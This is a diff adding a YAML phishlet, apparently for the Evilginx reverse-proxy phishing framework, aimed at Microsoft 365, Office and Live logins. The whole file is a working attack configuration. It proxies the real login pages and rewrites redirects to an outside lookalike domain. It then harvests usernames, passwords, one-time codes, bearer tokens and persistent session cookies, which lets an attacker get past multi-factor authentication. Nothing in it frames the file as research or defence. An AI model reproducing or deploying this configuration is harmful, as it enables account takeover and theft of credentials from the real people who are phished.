@@ -1,0 +1,86 @@
+name: 'PTA'
+author: '@Cyber-JA'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: true, is_landing: false}
+  - {phish_sub: 'live', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+sub_filters:
+  # The below filters are commented out, but are correctly formatted
+  # - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'www.office.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://anerzon.com', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: false}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'redirect_uri=https://{hostname}}', replace: 'redirect_uri=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'redirect_uri=https://{hostname}}', replace: 'redirect_uri=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTAUTH', 'ESTAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+  - domain: 'microsoftonline.com'
+    path: '/(.*)'
+    name: 'Bearer MSOnline'
+    header: 'authorization'
+    type: 'http'
+  - domain: 'microsoft.com'
+    path: '/(.*)'
+    name: 'Bearer MS'
+    header: 'authorization'
+    type: 'http'
+  - domain: 'office.com'
+    path: '/(.*)'
+    name: 'Bearer Office'
+    header: 'authorization'
+    type: 'http'
+auth_urls:
+  - '/'
+  - '/kmsi*'
+  - '/ppsecure/post.srf*'
+  - '/owa/prefetch.aspx*'
+  - '/webmanifest.json*'
+  - '/landingv2'
+  - 'v1/api/pass/o365/header'
+  - '/login.srf'
+  - '/api/pass/login'
+
+credentials:
+  username:
+    key: '(login|Username)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+  username:
+    key: '(login|UserName|username|email|account)'
+    search: '(.*)'
+  password:
+    key: '(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)'
+    search: '(.*)'
+  username:
+    key: '(login)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'otc'
+      search: '([0-9]*)'
+      type: 'post'
+    - key: 'id_token'
+      search: '(.*)'
+      type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
